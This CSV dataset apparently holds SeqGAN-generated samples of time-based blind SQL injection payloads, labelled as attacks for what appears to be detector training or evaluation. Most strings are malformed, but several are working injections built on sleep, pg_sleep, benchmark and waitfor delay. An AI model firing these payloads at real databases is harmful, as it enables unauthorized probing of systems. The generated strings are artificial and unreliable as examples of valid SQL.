label,payload,family,payload_type,method,run_id,sample_index
attack,1'+  (  select 'ddkxkxq ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1687
attack,1 or sleep  )sru 'yvtfvu'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1688
attack,"1't where 1568  =  (  =  benchmark  (  =  (  =  5000000,md5  (  1210  benchmark  (  "" 6793 from delay from pg_sleep  3824  =(  1210,sleep  (  sleep  (  sleep  (  5   )    8466 yaseg  )  (    (  5874",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1689
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1690
attack,"select   (  5000000,md5  select  (  (  5000000,m  5  sddh  )     )    (like",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1691
attack,waitfor from pg_sleep  (  5  )     )        )  srmq  )  srmq  )   and         (    (  select 6969 from from from   (  select  sleep  (  5   )    ande5874    (  select * from   (  selectye0x76555642   (  select 6793 6969 from and 6793  =    (  =    (  select 6969 from from pg_sleep  (  1210  (  5   )  )fsuvu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1692
attack,1' and 8594  =  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1693
attack,1 where '0:0:5'--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1694
attack,"1"" or 3824  =  benchmark  (  5   )    )    and    (     (  select 8514  =  7196 6969 from pg_sleep  (  5   )    )    and    (    (    (   6866  =    (      sleep  (    (  )    )     <> delay '0:0:5' '0:0:5'--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1695
attack,"1 or 6793  =    (  select from   (  (  5000000,md5  (  5000000,md5  (  5000000,md5  (  5  )  # like 5874per  )   (  ""uvzc"" 8594 "" #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1696
attack, select from or 6793  =    (  =  ' where 8252  =  1132 (  5   )     )  #  (  select 6969 omdo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1697
attack," 6793  =  # fpe  (   from pg_sleep  (  sleep  ('%'  (  select  (  benchmark  6383 and from sleep  (  sleep  (  (  5000000,  (  5   )     )   and   (  select from pg_sleep  (  5   (  5  (  select 6793 from or pg_sleep  srm_us re benchmark  (  2044  8507 or 4240 from and 3824  =    (    (  (  select or 6969mq  )s from kddmk1   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1698
attack,"1"" where '0:0:5' '0:0:5'--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1699
attack,select 6793 t  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1700
attack,1'pg_sleep  stawdqt or 8514  =  benchmark  (  (  (  select  (   (  select  6793   from pg_sleep  (  5  s 2239  =  62721  (  =  (  8485 * from from   7021  (  sleep  (  5  )    )     )  sdd and and    (    (    (  select or 4240  =    (    (  select e 6793  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1701
attack,  select from pg_sleep  (  0x544d5a4c  )   (  select  (  sleep  (  (  5   )    asele)   'rnzp'  =    (  8507 ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1702
attack,"waitfor    (  5000000,md5  =  (  (  select  (  5   )     (  0x544d5a4c   )    (  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1703
attack, select 6272  (  5   )    and     select 8594 from ulikelt  (  0x76555642   (     (  select from or delay '0:0:5'    (  select sleep  (  0x76555642        (  select * from from   (  1210  5   )    sdd5  )    )   and   =    (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1704
attack,select if    where 8667 bmd5  (  5   )sdd  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1705
attack,"     (  select 6793 from pg_sleep  (  5  )   )     )  sdd pd5  5000000,md5  (  =  5000000,md5  select  (  5   s3672 ""t  #wc  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1706
attack,1 where 2841  =  8507 #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,select (  5   )    )   -- 'yfvu' 'kvtfsrruuruvvtu)rluu'  =  'ras,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,"c  )   and    (    (     select 4240 from pg_sleep  (  benchmark  (  5   )    )     )   -- 8594  =    (  select 8594 from pg_sleep  (  5000000,md5  (  select from  8252 waitfor 4240 from   (  select  )   and   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack,"1"" and e   benchmark  select 6793 from 4240  =    (  62721132 ,md5  (  1210  (  select from pg_sleep  (  sleep  (  5000000,md5  (  5   )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,"1'+  (  select 'dke where '0:0:2'  ""zlal"" 't)   (    )     )   -- kq  =  5874h  )   and    (    (     (     (  select from   (  5   and    (     (     (  0x4c4d6142   )     )    )     )  ""%"" t  (    (  select 6793 8507  =    (     (  select from from pg_sleep  (  5   (  select 6969 4240  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack, where benchmark  (  5   )    )    )   )   (  select 6969 from not    (     (  5   )  gc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,"1 or 8514  =    (  (  5000000,md5  (  select 4240 from   (  select  (  5   (  sye   (  select 4240 from from   (  select   (      )  ""%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack,"'  =  '  ""%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
attack,select benchmark  (  5   )        (  select * from   (  (  select  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,"select benchmark  (  5000000,md5  (  ""uvzc"" * 8594  =  6272,sleep  (  5   )    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack,1 where 6793  =  1915  )o  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"select benchmark  (  0x694a4745   zl""%""  select from   (  5    )   # where 2044 or '0:0:5' --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,)     )   s kd5  1915,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,vhin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack, q  )   (  select 6969 pg_sleep  )    )     )   and    (     (  select 8594 from  (  =  benchmark  or sleep  (  5   )    )    (  )  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,"select    where 8594  =  (  =  benchmark  =  benchmark  (  5000000,md5  (  5000000,md5  (  0x694a4745   )    )     )   s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,select benchmark  (  5   )    )     )  sdddo  )    )    and   (    ?,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chin'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack,1 where delay '0:0:5' 7279  =    (     (  select 6793 from from pg_sleep  (     (  0x4c4d6142   (  select 4240    (  select 8594 from pg_sleep  (  5   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,select from   )    as be ae   (  select    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,1o%h''  =  'rr ruu'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,select sleep  srmkmq  )   and e 8514  5   )    )    as 4240  '+  (  select 'doddmdo) and 6793  =     )     )     )    and    (     (  select like from  (  =  benchmark  (  =  1132 and from   (  select  (  1132 rmd5  (  select 8667 from   (  5   (  select from pg_sleep  (  5   )    )    )    r where from   (    (  select 8594 from from from from   (  'hrta'  =  5   'fegp'  =    (     select,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,select sleep  (  0x544d5a4c   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,select 6793  )   and    (   6866  =  select from 8252 or * from   (  select  (  sleep  (  5   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,"select sleep  (  5   )    )     )   and   (  ""%""  =    (  select 3824  =  6272,sleep  (  (  5   )    )     )rmq  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,1'+  (  select 'dkxike   'rnzp'  select 4240 from pg_sleep  (  2239   (  0x544d5a4c   )     ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,"select sleep  (  (  select  (  5   )     )   pg_sleepn * from   (  select 6793me   (  )  sdd ke4683  (  0x544d5a4c   )    )   -- and    (""wucy""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,"select benchmark  (      (  5   ysiqselect from pg_sleep  ( w 8514  1210,sleep  (  8507 4240 from pg_sleep  0x544d5a4c   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,1'  )   waitfor delay '0:0:5'--,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,select    (  select * from   (  sleep  (  sleep  (  5   )    )    )    )     ),time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
attack," from pg_sleep  (  0x76555642 e 6969mq  s'sa' 6793 from pg_sleep  (  5000000,md5  (  select  (  5  )    aste from 6793  =    (  5   )     )   -- jd5  (    (  ""zlal""  =  1210,sleep  (  select 6793 from sleep     or 8466  =  2239 rmiq 8594 from where waitfor 8507_  (  select from or 3824  =  (  2841 or sleep  (  benchmark  (  sleep  (  sleep  (  5000000,md5  (  select * ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1738
attack,select benchmark  (  5   )     )  sdkere where 7196  0x4c4d6142   )  -- where 7305  =  (  =  sleep  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1739
attack,select 6793 or from1 pg_sleep  (  (  select  (  5   )    )    )     s  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1740
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  ""'  =  '   )    )   and elt  (  1210,sleep  (  'hrta'  =  benchmark  (  =  benchmark or 6793 from from 3824  =  5000000(  =    (   and 8466  5   )        )    and   (  select or sleep  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1741
attack,     )     )   #wq  )     )    eld from pg_sleep  0x4c4d6142   )     )    and    (     (  select 8594 from pg_sleep  (  5 r and elt(  )  # y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1742
attack," where (  0x544d5a4c   )    )    and   (     (  select )  (  select 6793   (  =  benchmark  =  = from from pg_sleep  (  0x544d5a4c   and sleep  6175 6793  =  4683  )     )     <> '0:0:2' ""uuu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1743
attack,1 and elt  (  0x544d5a4c   (   select 6793 from where '0:0:5' '0:0:5')   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1744
attack,11679 8514 '   )    )     )   and sleep  (  5  )   and    (    (     (  't 8514 7279  =    (  (  select (  (  5  )    )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1745
attack,select    )    aw    )   and    (     (select 6793 from  )   (   (  select like from pg_sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1746
attack,1   )    as be   y 8594  )    )   )     )   -- k,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1747
attack,c' select 6793 -- #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1748
attack, and from pg_sleep  (  select from 3824  =  (  =  2239 from pg_sleep  (  5   )    and    (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1749
attack,1'  )   waitfor delay '0:0:5'oin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1750
attack,1o and elt  (  0x544d5a4c   )    )     )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1751
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1752
attack,1 and from   2388  0x544d5a4c  (    (  select  (  0x544d5a4c   # like ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1753
attack,select  where delay from   (  select from pg_sleep  (  5   and    (     5   r8594 --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1754
attack,", pg_sleep  (  5000000,md5  (  (  5   )    ru #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1755
attack,"1'+  (  select 'dojjpe 6793 from from from   (  select 3824  =  8667 sleep  (  5000000,md5  (  1210  5000000,md5  (  (  5   )      6793  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1756
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'l'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1757
attack, kfrom t  (  5  )   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1758
attack,"1   (  =      (     (  select 4240 from  from from frompg_sleep  (  5  )   (  select *    (  0x544d5a4c and * elt  (  5000000,md5  (  5   )    (  select * sleep  (  6272  =  benchmark  (  5000000,md5  (  select  (  5   )    (  select 6793 '0:0:5') from 8466  1210,sleep  (  5   )    e 8466  =    (  select from 3824  1210,sleep  (  5   )     )   fv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1759
attack, 5   )    as  e or   (  select 6793 from pg_sleep  (  5   )    )     pg_sleepu  )  sddo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1760
attack,select benchmark  5   )    )   )   and from   =  select from from  =  (  sleep  sleep  (  =  (  6866  (  =  benchmark  (  5   )     )  )gparu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1761
attack,"select benchmark  (  5   )    )     )   <> d5    (   <> delay '0:0:5' -- 'f  =   and    (    (     6175 where 9649  # or elt  (  benchmark  (  =  (  9008 and from   (  0x4c4d6142  select * from   (  sleep  5000000,md5  (  5   (     (  select '0:0:5'   (  s  =    (  0x76555642   and 4240  =    (  select * from   (  select  (  sleep  (  5000000,md5  (  (  5000000,md5  (  5   )    (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1762
attack,"1 or 4240  =    (select   (    (  5   )     )   -- 1679    (    (  select from pg_sleep  (  5  set  (  select or from from pg_sleep  (  5gvo  =    (    (  select 6793 from from pg_sleep  (  5   )    )     )   and e 8514  =  6272,sleep  (  sleep  (  (  5000000,md5  (    (  5   )    (     (  select e 6793   =  6383 8507  =    (     (  'rnzp'  =    )   -- a",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1763
attack,select sleep  (  sleep  (  select (  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1764
attack, o  )fs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1765
attack,select pg_sleep  (  5000000'0:0:5' --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1766
attack, and    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1767
attack,1'||  (  select 'oeoe'   )    )     )   and sleep  (  5  )   and    (    (     (  'zh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1768
attack,"1"" or 8466  =    benchmark  (  sleep  5   )    )     )   <> 'sa' from pg_sleep  (  0x544d5a4c   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1769
attack,"1 or 8514  =  1210(  5000000,md5  (  select  (  benchmark  (  5   )    <> 2388  =  6272,sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1770
attack,select sleep  (  5   )     )   # n y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1771
attack,"1%'  )   rlik     =  1210,sleep  (  5000000,md5  (  0x694a4745   (    )    )     )   and 8466  =  0x544d5a4c   )    )     )   and    (select ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1772
attack,     (  '  )    )   -- bmq  6272,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1773
attack,1o  )   -- #wpq  )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1774
attack," kand   (  select  (  5   )    )     )    nuand    (     (    (  select 4240 from and 3824  =  benchmark  (  1210,sleep  2044 benchmark  (  1210,,sleep  (  sleep  (  sleep  (  5  )   or e 8594  =  1915u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1775
attack,"1""lt  )   -- azo  )     )  sddo  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1776
attack,"1 where from from   (  select    (  5   )  )   )     )se 3824  (  1210   from "" pg_sleep  (  (  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1777
attack,1'+  (  select 'dd't where 6383  (  =  7279 and 6793 from 3824  =  1210  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1778
attack,1 where sleep  =  9649 and sleep  (  5  )  sddo,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1779
attack, 6793  yragp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1780
attack,  )  gcruqn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1781
attack,1 where pg_sleep  (  (  0x544d5a4c   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1782
attack,cfp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1783
attack,select from   (  0x544d5a4c   )  st  # 'fegp'do  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1784
attack," select sleep  (  5000000,md5  (    5   )     )   'wyvx'  =    (  select 8594 from from pg_sleep  (  5   (      (  sleepu)",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1785
attack,select    (  select from   (  select  (  select  (  (  0x6d457153   )    )     #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1786
attack,1   )    and    (    (  select 6793 from 8466 from 8514  =  2239 -- ou,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1787
attack,1 or   (  select 4240 from   (  select  (  sleep  (  5     )    rlu 8594 from pg_sleep)    )    and    (    ( where or from   (  select  (  5  )  sddomq  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1788
attack,"1 or   (  select from and pg_sleep  (  5   )     )   # ruesddmdo  =  r  (  select * from   (  select  (  5000000,md  =  (  benchmark  (  5   )    )     )  and 6969 emd5  (  benchmark  (    (  5000000,md5  (  0x544d5a4c   )    )     )   and   'rnzp'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1789
attack,select benchmark  (  5 or 6793 from yas xiq 2388  =  benchmark  (  5   )     )   #f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1790
attack,"1r   )    rlike   (  1210,sleep   from   (  select  (  5   )    )     )    )    and 6793md5  'hrta'select from pg_sleep  (  5   )    )   and   (  =    and     (  select *md  =  (  benchmark  (  (  sleep  (  5  )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1791
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rs'  =  'tn '   )    )     )   and sleep  (  5  )   and    (    (     (  '' where 1241  =  1241 waitfor delay '1568 ""   kd5  (  'hrta'  =    (' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'ppdkezl",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1792
attack,1 or 8514  =  4683 6793 6969 --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1793
attack,select sleep  )   or 6793  =     select 4240 from pg_sleep  (  sleep  (  5   (    (  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1794
attack," ""uvzc"" 6793 -- rmq  )   )    )   # or 6793o  2239 ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1795
attack,1 where from   (  select from   (  select  (  sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1796
attack,select    (  select    (  '%'  5   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1797
attack,"1 where from   (    (  select 4240  =  (  =  benchmark  (  5(  select 8594 from pg_sleep  (  5000000   )    )sdo,)   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1798
attack,", pg_sleep  (  0x4c4d6142   )    )    )    and elt  (  6272,sleep  (  =  g * from   )   (  =  benchmark     (  select 8594  (  6272,sleep  (  5   )    )     )    and    (    (     5   )    )sg  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1799
attack,"1'   and elt  (  0x76555642   )     )   (  select from 4240 from from from   (  select  (  sleep  (  5000000,md5  (  5   )    )     (  select 4240 from   (  =  select pg_sleep  (  5000000,md5  (  5000000,md5  (  5000000,md5  (  5   and    (    (   'fegp'  =  4683 and   (  select from 6793  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1800
attack,"1""   )    )       (  =    rlike from   (  select 4240 from   (  select  (  =  benchmark  0x76555642   (  select 4240 from pg_sleep 6793  =  6272,from   (  2044  =  =  (  =  1210,sleep  (  5000000,md5  (  5   and    (    (    (    (  select * from   (  select  5   )    and  sddzs  )  benchmark  # like ys",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1801
attack,"select pg_sleep  (  0x544d5a4c  )  sw  u  5   )     )   and    (    (     (  ""%""  1915",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1802
attack,"=1 and 8466  =  7196  6272,sleep  (  5   )    and         (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1803
